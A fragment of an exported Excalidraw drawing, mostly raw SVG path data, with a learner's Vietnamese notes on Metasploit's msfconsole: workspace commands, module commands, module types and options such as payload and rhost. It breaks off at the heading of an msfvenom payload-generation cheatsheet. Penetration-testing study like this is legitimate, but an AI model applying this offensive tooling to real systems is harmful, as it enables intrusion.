<path d="M937.22 2191.87 L937.16 2190.81 L936.76 2189.80 L936.30 2188.98 L935.78 2188.44 L934.98 2187.91 L934.01 2188.27 L933.38 2189.09 L933.26 2189.98 L933.15 2191.04 L933.61 2193.94 L933.84 2195.54 L934.18 2196.90 L934.47 2198.96 L934.64 2200.15 L934.70 2201.33 L934.29 2202.33 L933.84 2203.04 L933.26 2203.81 L932.52 2204.51 L931.95 2205.16 L931.37 2205.87 L931.60 2204.75 L932.06 2203.81 L932.52 2202.98 L932.92 2202.27 L933.32 2201.56 L933.78 2200.85 L934.41 2200.15 L934.41 2200.15" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M939.11 2200.26 L939.62 2200.85 L940.94 2200.68 L941.92 2200.26 L943.35 2199.44 L943.86 2198.85 L944.72 2197.78 L945.35 2196.78 L945.81 2195.89 L946.10 2194.83 L945.93 2193.76 L945.01 2194.06 L944.09 2195.71 L943.23 2197.19 L942.78 2198.67 L942.66 2199.91 L942.66 2200.97 L942.95 2201.74 L943.58 2202.68 L944.55 2203.10 L945.64 2203.16 L945.64 2203.16" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M956.59 2197.13 L956.47 2196.07 L955.78 2195.65 L954.81 2195.89 L954.41 2196.84 L954.35 2197.90 L954.35 2199.26 L954.41 2200.32 L954.52 2201.39 L954.52 2202.74 L954.52 2203.92 L954.41 2204.99 L954.01 2205.87 L953.43 2206.52 L952.52 2206.94 L951.31 2206.82 L951.03 2206.05 L951.49 2205.40 L951.49 2205.40" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M957.33 2201.27 L957.96 2200.74 L958.71 2200.26 L959.45 2199.67 L960.02 2199.20 L960.20 2200.15 L960.42 2200.97 L960.71 2201.98 L961.06 2202.74 L961.34 2203.51 L961.74 2204.34 L961.97 2205.22 L962.03 2206.41 L961.69 2207.23 L961.28 2207.94 L960.65 2208.53 L959.68 2208.18 L959.68 2208.18" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M964.67 2199.67 L964.72 2200.85 L964.49 2201.92 L964.38 2202.98 L964.15 2203.98 L963.98 2205.11 L963.98 2206.17 L963.98 2206.17" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M973.38 2205.58 L972.75 2206.11 L972.11 2206.70 L971.54 2207.53 L970.97 2208.42 L970.68 2209.24 L970.34 2210.19 L970.05 2211.02 L970.57 2210.37 L971.20 2209.18 L971.83 2207.23 L972.52 2205.52 L972.92 2204.28 L973.26 2203.33 L973.78 2202.27 L974.12 2201.33 L974.98 2201.03 L975.90 2201.27 L976.70 2201.74 L977.27 2202.45 L977.73 2203.33 L978.07 2204.16 L978.30 2205.05 L978.48 2206.05 L978.59 2206.94 L979.28 2206.46 L980.08 2205.76 L980.82 2205.22 L982.09 2204.63 L983.69 2203.81 L985.01 2203.33 L986.15 2203.16 L987.47 2203.45 L988.22 2204.28 L988.62 2205.34 L988.62 2207.29 L988.10 2209.36 L987.59 2210.54 L987.59 2210.54" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M912.08 2308.17 L911.75 2307.20 L911.28 2306.31 L910.68 2307.20 L910.75 2308.91 L910.75 2310.39 L910.75 2311.95 L910.82 2313.36 L910.95 2314.70 L910.95 2314.70" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M904.68 2305.57 L904.48 2304.23 L904.75 2303.12 L906.35 2301.26 L907.82 2299.70 L908.95 2298.66 L910.15 2297.92 L911.28 2297.40 L912.48 2297.18 L914.08 2297.18 L915.68 2297.40 L915.68 2297.40" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M928.88 2317.74 L928.28 2316.78 L927.68 2315.96 L926.88 2315.44 L925.88 2315.07 L924.55 2315.15 L923.68 2315.74 L923.02 2316.56 L922.55 2317.60 L922.22 2318.64 L922.22 2320.05 L923.22 2320.64 L924.35 2320.34 L925.15 2319.68 L925.95 2318.79 L926.55 2317.82 L927.08 2317.00 L927.48 2316.04 L928.15 2315.29 L928.22 2316.63 L928.28 2318.12 L928.48 2319.60 L928.55 2320.94 L928.75 2322.13 L928.95 2323.31 L929.55 2324.21 L930.88 2324.13 L931.88 2323.76 L931.88 2323.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M931.55 2321.98 L932.15 2320.86 L932.68 2319.97 L933.42 2318.94 L933.95 2317.74 L934.48 2316.63 L934.88 2315.67 L935.22 2314.70 L935.68 2313.59 L936.62 2314.18 L937.08 2315.44 L937.35 2316.78 L938.15 2319.38 L938.42 2321.24 L938.68 2322.57 L939.08 2323.54 L939.48 2324.65 L940.35 2325.24 L940.35 2325.24" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M946.48 2318.79 L946.95 2317.67 L946.42 2316.63 L945.15 2316.56 L944.02 2317.23 L943.22 2317.89 L942.55 2318.71 L942.08 2319.82 L942.82 2320.49 L943.82 2320.05 L944.68 2319.53 L945.55 2318.71 L946.22 2318.12 L946.95 2317.30 L947.55 2316.56 L948.28 2317.45 L948.75 2320.34 L948.95 2321.83 L949.22 2324.73 L949.48 2327.47 L949.55 2328.74 L949.62 2330.81 L949.62 2332.45 L949.62 2333.79 L949.55 2335.19 L949.22 2336.46 L948.08 2336.90 L947.28 2336.38 L946.48 2335.56 L945.82 2334.75 L945.22 2333.86 L945.22 2332.52 L945.68 2331.56 L947.55 2329.48 L949.28 2327.84 L951.15 2326.29 L952.95 2324.80 L953.75 2324.21 L954.48 2323.54 L955.62 2322.50 L956.55 2321.68 L957.88 2320.20 L958.42 2319.16 L958.68 2317.82 L958.62 2316.41 L957.95 2315.52 L956.75 2315.96 L956.15 2316.93 L955.82 2318.19 L955.62 2319.53 L955.75 2320.86 L956.08 2321.98 L957.02 2322.65 L957.02 2322.65" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M970.22 2307.28 L969.88 2308.31 L969.55 2309.80 L968.82 2313.29 L968.35 2315.29 L968.02 2317.00 L967.75 2318.49 L967.55 2319.68 L967.28 2321.16 L967.08 2322.28 L967.08 2322.28" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M965.68 2321.83 L965.22 2320.79 L964.95 2319.68 L965.42 2318.56 L966.48 2318.19 L967.75 2318.12 L971.48 2318.12 L974.48 2318.19 L974.48 2318.19" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M986.22 2311.73 L986.48 2310.69 L987.35 2310.10 L988.68 2310.32 L989.48 2311.21 L989.68 2312.55 L988.82 2315.29 L987.35 2317.67 L985.82 2319.90 L984.35 2321.83 L983.62 2322.79 L982.95 2323.54 L982.15 2324.73 L981.55 2325.69 L981.62 2327.03 L983.48 2328.51 L986.22 2329.48 L989.42 2330.07 L991.22 2330.52 L991.22 2330.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M972.15 2257.16 L972.48 2256.12 L973.42 2255.23 L975.62 2253.07 L977.15 2251.44 L977.88 2250.62 L978.95 2249.29 L979.75 2248.25 L980.28 2247.43 L980.82 2246.54 L981.35 2245.72 L980.88 2246.91 L980.02 2249.73 L979.22 2252.18 L978.48 2254.49 L978.22 2255.60 L977.68 2257.45 L977.42 2259.09 L977.15 2260.35 L976.95 2261.46 L976.95 2261.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M974.35 2266.96 L975.02 2265.92 L976.02 2265.55 L978.75 2264.95 L982.08 2264.51 L983.75 2264.43 L983.75 2264.43" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M605.15 885.80 L605.68 886.77 L606.28 887.59 L606.88 888.33 L606.88 888.33" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="589.02" y="874.10" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="589.02" dy="0">Phần này nói về các câu lệnh giúp quản lý workspace,</tspan><tspan x="589.02" dy="25">cũng như database của msfconsole</tspan><tspan x="589.02" dy="25"></tspan><tspan x="589.02" dy="25">=&gt; cái này khác với phiên</tspan><tspan x="589.02" dy="25">=&gt; nó là databasse của cả cái app msfconsole </tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<text x="756.35" y="888.13" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="756.35" dy="0">8</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M833.75 2377.06 L832.88 2376.47 L831.88 2375.95 L831.08 2376.84 L830.35 2379.81 L830.02 2382.41 L829.82 2385.23 L829.88 2388.28 L830.28 2391.32 L830.95 2394.29 L831.88 2397.19 L833.02 2399.93 L834.48 2402.46 L836.28 2404.69 L837.15 2405.72 L839.42 2407.43 L841.75 2408.77 L844.15 2409.96 L846.55 2410.85 L848.68 2411.51 L850.35 2411.89 L851.55 2412.19 L852.68 2412.48 L853.82 2412.85 L855.02 2413.30 L855.95 2413.74 L855.95 2413.74" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M857.62 2408.92 L857.35 2407.80 L858.28 2408.55 L858.95 2409.36 L859.35 2410.26 L859.82 2411.22 L859.75 2412.48 L858.55 2413.97 L856.62 2415.45 L855.42 2415.97 L852.95 2417.16 L848.95 2418.27 L847.62 2418.64 L847.62 2418.64" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="883.28" y="2418.60" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="883.28" dy="0">mình sẽ hiểu được sesion là cái gì</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<text x="605.68" y="93.05" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="605.68" dy="0">Phần này thì là các câu lệnh thao tác để </tspan><tspan x="605.68" dy="25">-search, use , set, run .... 1 module </tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M944.88 107.28 L944.88 105.95 L945.95 106.17 L947.08 108.77 L947.62 111.22 L947.55 113.96 L946.95 117.23 L945.75 120.72 L943.35 126.07 L941.55 129.63 L940.55 131.34 L938.75 134.61 L937.35 137.28 L936.08 139.81 L935.08 142.03 L934.75 143.00 L934.28 144.78 L934.22 146.34 L934.35 147.60 L934.62 148.86 L935.62 151.91 L936.55 154.21 L937.35 156.51 L937.95 159.04 L938.42 161.56 L938.48 163.71 L937.95 167.43 L937.15 170.25 L936.08 173.07 L935.02 175.67 L934.02 178.27 L932.68 182.05 L932.22 183.31 L931.88 184.58 L931.48 186.73 L931.35 188.66 L931.42 190.52 L932.15 193.86 L933.22 196.31 L934.55 198.46 L935.35 199.43 L937.08 201.29 L938.95 203.14 L939.75 203.89 L943.22 208.56 L943.42 209.97 L943.15 211.46 L942.68 212.79 L941.62 215.32 L940.48 217.92 L939.22 220.37 L938.02 223.11 L937.15 225.79 L936.55 228.54 L936.42 229.95 L936.62 233.96 L937.15 236.63 L937.95 239.23 L939.02 241.60 L940.08 243.76 L940.62 244.57 L941.48 246.13 L942.08 247.25 L942.55 248.29 L942.95 249.40 L943.08 250.96 L943.08 250.96" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="951.48" y="153.05" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="951.48" dy="0">exploit</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<text x="949.35" y="195.45" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="949.35" dy="0">auxiliary</tspan><tspan x="949.35" dy="25"></tspan><tspan x="949.35" dy="25">post</tspan><tspan x="949.35" dy="25"></tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M752.82 126.36 L752.48 127.33 L752.35 131.64 L752.08 133.34 L751.55 137.13 L750.42 143.66 L749.62 147.97 L748.88 151.76 L748.15 155.25 L747.55 158.51 L747.28 160.00 L746.62 162.75 L746.35 163.94 L745.95 166.01 L745.68 167.65 L745.42 168.91 L745.02 170.03 L745.02 170.03" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M739.55 158.89 L739.02 158.07 L738.28 158.89 L738.02 162.90 L737.88 166.01 L737.95 169.06 L738.02 170.62 L738.15 172.99 L738.28 175.00 L738.68 176.64 L739.15 177.82 L739.82 178.71 L740.75 179.23 L743.22 178.71 L747.62 174.78 L750.35 171.21 L752.82 167.43 L752.82 167.43" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M709.55 190.74 L709.62 188.96 L709.88 187.92 L710.42 186.51 L711.15 185.76 L712.35 185.99 L712.42 188.51 L711.82 191.93 L710.62 195.94 L709.88 197.94 L708.35 202.10 L706.68 206.26 L705.08 210.19 L703.55 214.06 L701.55 219.03 L701.02 220.59 L699.95 223.41 L699.15 226.16 L698.42 228.76 L698.15 229.80 L697.82 231.80 L697.55 233.51 L697.55 235.07 L697.82 237.44 L698.68 241.75 L699.48 244.57 L700.35 247.39 L701.22 249.92 L702.02 252.67 L702.35 254.00 L702.88 256.83 L703.35 259.72 L703.62 262.62 L703.75 265.51 L703.75 268.71 L703.62 271.75 L703.48 274.94 L703.08 278.14 L702.55 281.48 L701.75 284.89 L700.95 288.09 L700.22 291.28 L699.88 292.76 L699.35 295.44 L699.15 296.70 L698.88 298.63 L698.82 300.11 L698.68 301.82 L698.68 301.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="707.22" y="229.38" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="707.22" dy="0">payload</tspan><tspan x="707.22" dy="25">rhost</tspan><tspan x="707.22" dy="25">...</tspan></text>
</g>
<g transform="translate(98.59,25.19)">
<path d="M586.88 90.06 L587.42 89.24 L586.62 88.57 L585.15 88.27 L582.95 88.50 L580.15 89.09 L577.48 89.98 L576.02 90.43 L573.55 91.69 L571.28 93.03 L569.22 94.59 L567.42 96.37 L565.88 98.22 L564.68 100.23 L563.75 101.79 L562.95 104.61 L562.68 106.02 L562.48 107.51 L562.35 108.91 L562.35 108.91" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M558.75 97.93 L559.35 100.82 L560.02 103.42 L560.55 106.09 L561.15 108.69 L561.48 109.96 L562.08 111.96 L562.48 113.52 L562.88 114.71 L563.22 115.67 L563.55 116.79 L564.08 117.60 L566.88 115.97 L569.28 113.52 L569.28 113.52" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M271.35 571.73 L271.15 570.62 L270.82 569.51 L270.22 568.46 L269.42 567.58 L266.55 565.57 L263.82 564.24 L260.08 562.90 L255.48 561.71 L250.22 560.67 L243.75 559.63 L240.35 559.33 L233.08 558.59 L225.82 558.14 L218.55 557.77 L211.15 557.70 L203.68 557.77 L193.02 558.44 L186.22 559.11 L183.02 559.56 L176.55 560.67 L170.62 562.01 L165.28 563.49 L160.42 565.05 L155.95 566.69 L151.88 568.24 L148.22 569.88 L146.68 570.62 L143.95 572.03 L141.42 573.44 L138.28 575.89 L136.62 577.60 L135.35 579.31 L134.82 580.20 L134.15 581.68 L133.88 583.09 L134.02 584.58 L134.55 586.44 L135.62 588.59 L137.42 590.74 L140.08 592.89 L145.55 596.01 L147.68 596.98 L152.35 598.61 L157.82 600.17 L163.75 601.66 L170.02 602.84 L176.48 603.74 L183.08 604.48 L189.82 605.07 L193.42 605.22 L200.15 605.81 L206.22 606.19 L214.88 606.71 L220.55 606.93 L225.95 607.15 L231.22 607.23 L236.42 607.15 L239.08 606.93 L244.28 606.63 L249.68 605.81 L255.02 604.78 L260.62 603.59 L265.62 602.18 L270.08 600.99 L274.22 599.50 L278.02 598.02 L281.42 596.31 L284.15 594.68 L286.68 592.89 L288.82 590.89 L290.62 588.51 L291.95 585.62 L292.42 584.06 L292.68 580.57 L291.95 576.71 L290.28 572.62 L287.48 568.69 L281.15 563.34 L276.48 560.45 L272.02 558.66 L269.82 558.14 L265.62 557.77 L263.68 558.07 L263.68 558.07" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M394.82 590.30 L396.55 589.48 L397.82 588.96 L400.75 588.07 L404.68 587.25 L409.68 586.88 L415.62 586.81 L423.15 587.25 L432.35 588.22 L437.28 588.96 L447.28 590.81 L459.15 593.34 L468.68 595.79 L479.68 598.84 L492.48 602.99 L500.48 605.89 L507.75 608.93 L514.08 611.98 L516.95 613.39 L522.42 616.43 L527.35 619.55 L531.75 622.74 L535.15 625.64 L538.28 628.54 L540.82 631.28 L544.15 635.74 L545.75 638.41 L546.55 639.75 L547.88 642.49 L548.95 645.31 L549.95 648.14 L550.82 651.11 L551.55 654.37 L552.08 657.71 L552.75 661.36 L553.08 664.92 L553.28 668.56 L553.35 670.34 L553.35 673.98 L553.28 679.03 L553.15 682.29 L553.02 685.04 L552.88 687.27 L552.75 688.98 L552.62 690.46 L552.55 692.17 L552.48 693.36 L552.48 694.77 L552.35 695.96 L552.28 697.22 L552.08 698.41 L552.02 699.82 L552.02 699.82" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M545.55 684.89 L544.82 684.22 L544.15 684.89 L544.15 686.53 L544.22 687.94 L544.55 689.87 L544.82 692.17 L545.08 694.03 L545.48 695.51 L545.75 696.70 L546.02 698.04 L546.48 698.93 L547.68 699.15 L550.48 697.81 L553.08 695.88 L556.15 693.36 L559.68 690.16 L563.75 686.08 L568.02 681.63 L573.35 676.35 L575.95 673.76 L575.95 673.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<text x="501.88" y="740.98" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="501.88" dy="0">cái này áp dụng cho phần III)</tspan><tspan x="501.88" dy="25">=&gt; cứ xem là mình sẽ hiểu</tspan></text>
</g>
<a href="./metasploit---post-exploit" class="excalidraw-node-link" target="_self" title="metasploit - post exploit"><g transform="translate(98.59,25.19)">
<text x="799.48" y="769.56" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="20" fill="#c2255c" text-anchor="start"><tspan x="799.48" dy="0">📍 metasploit - post exploit</tspan></text>
</g></a>
<g transform="translate(98.59,25.19)">
<path d="M799.96 2583.02 L800.84 2583.02 L801.76 2583.02 L801.76 2581.95 L802.83 2581.95 L804.96 2581.95 L806.03 2581.95 L807.10 2583.02 L809.72 2584.35 L812.12 2587.02 L812.12 2590.83 L813.19 2594.18 L814.44 2597.74 L815.84 2602.64 L815.84 2607.46 L815.84 2612.66 L815.84 2615.96 L815.84 2620.33 L815.84 2622.46 L815.84 2624.59 L814.77 2626.73 L813.50 2627.79 L812.42 2629.04 L812.42 2630.04 L813.58 2630.04 L813.58 2630.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M884.90 2659.94 L883.08 2659.94 L883.08 2658.88 L880.92 2658.88 L878.52 2656.50 L874.66 2655.11 L872.44 2654.03 L872.44 2652.95 L872.44 2651.94 L872.44 2650.96 L873.51 2649.89 L874.57 2648.83 L877.23 2646.70 L880.79 2644.21 L882.92 2642.89 L886.48 2642.89 L889.69 2641.81 L891.82 2641.81 L893.96 2641.81 L896.09 2641.81 L898.22 2640.74 L900.36 2640.74 L901.42 2641.81 L902.68 2642.88 L902.68 2644.15 L902.68 2646.29 L902.68 2648.42 L901.38 2650.78 L900.30 2652.99 L899.22 2654.06 L898.14 2655.14 L895.99 2656.21 L894.71 2657.29 L892.37 2658.35 L891.31 2658.35 L890.24 2658.35 L889.17 2659.62 L887.92 2659.62 L888.76 2659.62 L889.74 2659.62 L890.81 2659.62 L892.94 2659.62 L895.07 2659.62 L897.21 2659.62 L899.34 2659.62 L900.41 2659.62 L901.47 2659.62 L902.54 2659.62 L903.61 2659.62 L903.61 2660.69 L904.67 2660.69 L904.67 2661.75 L904.67 2662.82 L905.74 2663.90 L905.74 2666.04 L905.74 2668.18 L905.74 2669.24 L904.66 2671.45 L904.66 2673.59 L903.58 2674.66 L903.58 2675.74 L904.48 2675.74 L905.46 2675.74 L908.67 2673.28 L914.23 2670.61 L921.62 2669.03 L928.74 2665.77 L930.90 2664.39 L932.21 2664.39 L933.28 2664.39 L934.32 2664.39 L934.32 2665.23 L935.33 2667.31 L936.41 2669.51 L937.48 2671.92 L938.79 2674.27 L939.86 2676.68 L939.86 2677.74 L940.92 2677.74 L939.95 2677.74 L939.95 2676.76 L939.95 2672.11 L939.95 2668.91 L939.95 2666.78 L939.95 2665.71 L940.94 2665.71 L942.01 2667.79 L943.32 2670.26 L945.90 2673.99 L947.05 2676.28 L949.27 2679.84 L950.56 2681.13 L951.62 2681.13 L951.62 2680.16 L951.62 2679.18 L951.62 2677.05 L952.93 2674.70 L952.93 2673.63 L953.97 2673.63 L954.91 2673.63 L957.04 2673.63 L959.17 2674.70 L961.79 2675.76 L964.54 2676.83 L968.10 2678.14 L969.18 2679.20 L970.25 2679.20 L969.27 2679.20 L968.47 2679.20 L967.42 2679.20 L967.42 2678.14 L968.49 2678.14 L969.56 2677.07 L969.56 2677.07" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M1006.56 2685.87 L1005.58 2685.87 L1004.51 2686.85 L1003.45 2686.85 L1002.38 2686.85 L1001.31 2686.85 L999.18 2686.85 L998.11 2686.85 L998.11 2686.85" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M1090.61 2673.75 L1089.54 2673.75 L1089.54 2674.68 L1089.54 2676.67 L1089.54 2678.81 L1088.47 2679.87 L1088.47 2680.94 L1088.47 2682.01 L1087.42 2682.01 L1087.42 2683.06 L1086.35 2684.12 L1085.29 2684.12 L1084.24 2684.12 L1083.39 2684.12 L1082.31 2680.42 L1079.79 2674.99 L1077.30 2670.11 L1076.22 2666.45 L1076.22 2664.07 L1075.16 2664.07 L1076.15 2664.07 L1077.11 2664.07 L1079.24 2666.20 L1080.49 2667.26 L1081.56 2668.54 L1081.56 2669.61 L1082.63 2670.67 L1082.63 2671.65 L1081.65 2671.65 L1081.65 2672.63 L1081.65 2673.39 L1082.60 2673.39 L1082.60 2673.39" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M820.20 2760.21 L820.20 2760.64 L820.20 2762.66 L820.20 2765.86 L820.20 2767.99 L820.20 2771.19 L820.20 2773.32 L820.20 2776.52 L820.20 2778.65 L820.20 2780.79 L820.20 2784.01 L819.13 2787.21 L819.13 2790.48 L819.13 2794.79 L817.73 2798.87 L817.73 2801.01 L816.65 2803.15 L816.65 2805.29 L816.65 2806.36 L816.65 2805.49 L816.65 2801.29 L816.65 2797.87 L816.65 2796.79 L816.65 2796.79" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M821.26 2777.38 L821.96 2777.38 L822.83 2777.38 L823.80 2777.38 L824.86 2777.38 L825.93 2777.38 L827.00 2777.38 L828.06 2777.38 L829.13 2777.38 L830.20 2777.38 L831.26 2777.38 L832.31 2776.31 L833.59 2773.91 L835.81 2771.37 L838.52 2767.26 L842.34 2763.71 L845.08 2758.18 L849.51 2754.14 L851.99 2751.66 L853.07 2750.53 L853.07 2749.46 L852.09 2749.46 L851.42 2749.46 L850.40 2750.48 L849.33 2752.84 L847.99 2755.00 L845.34 2759.08 L844.01 2762.94 L841.49 2766.87 L840.08 2771.82 L838.96 2777.12 L837.38 2782.44 L835.85 2787.31 L835.85 2792.20 L835.85 2795.48 L834.78 2798.70 L834.78 2800.85 L834.78 2802.99 L834.78 2804.06 L834.78 2805.13 L835.79 2805.13 L835.79 2806.14 L836.76 2806.14 L836.76 2805.31 L836.76 2804.24 L839.24 2800.96 L839.24 2799.55 L839.24 2799.55" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M857.90 2773.42 L857.90 2774.39 L856.83 2776.54 L855.69 2778.69 L855.69 2781.97 L854.63 2784.11 L854.63 2787.33 L853.29 2789.72 L853.29 2791.86 L853.29 2793.99 L853.29 2795.06 L854.36 2796.12 L854.36 2797.19 L855.43 2798.26 L856.49 2799.32 L857.56 2799.32 L858.63 2799.32 L859.69 2799.32 L860.58 2796.87 L860.58 2793.66 L861.71 2789.14 L861.71 2784.59 L861.71 2783.44 L861.71 2783.44" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">
<path d="M859.10 2775.12 L860.21 2775.12 L860.77 2775.12 L861.35 2775.12 L862.11 2775.12 L862.11 2776.20 L863.37 2777.28 L863.37 2779.68 L863.37 2781.81 L863.37 2783.95 L863.37 2787.15 L863.37 2789.28 L863.37 2791.41 L863.37 2794.61 L862.31 2798.09 L862.31 2800.51 L862.31 2802.64 L862.31 2804.77 L862.31 2805.84 L862.31 2805.00 L862.31 2804.03 L863.61 2800.48 L867.71 2794.81 L872.01 2790.79 L878.40 2784.39 L882.76 2778.01 L890.95 2773.08 L896.86 2768.66 L902.79 2765.92 L904.09 2764.62 L904.09 2765.74 L904.09 2770.00 L904.09 2773.29 L904.09 2777.72 L902.68 2782.70 L902.68 2785.08 L902.68 2788.31 L902.68 2790.44 L902.68 2791.51 L902.68 2792.58 L902.68 2793.64 L903.74 2794.71 L904.74 2794.71 L904.74 2794.10 L905.73 2794.10 L908.38 2789.31 L912.39 2784.06 L916.87 2779.73 L919.57 2777.26 L920.64 2774.86 L921.70 2774.86 L921.70 2775.79 L922.67 2777.11 L923.99 2779.51 L923.99 2781.92 L926.39 2785.13 L926.39 2788.68 L928.76 2791.31 L928.76 2793.71 L929.82 2794.77 L930.89 2794.77 L929.92 2794.77 L928.95 2794.77 L927.61 2792.64 L927.61 2789.18 L927.61 2787.04 L928.68 2785.98 L928.68 2783.82 L929.75 2783.82 L929.75 2783.82" stroke="#000000" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(98.59,25.19)">

<rect x="-33.63850775363636" y="3725.3527014621623" width="907.2770155072727" height="2118.294597075676" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="-33.63850775363636" y="3725.3527014621623" width="907.2770155072727" height="2118.294597075676" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📋 Cheatsheet: Metasploit Payload Generation (msfvenom)</span>
      </div>
      <a href="#doc-01771b58dcd7919226ba46f80de5395776815dce" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <h3>📋 Cheatsheet: Metasploit Payload Generation (msfvenom)</h3>
<h4>Cú pháp cơ bản</h4>
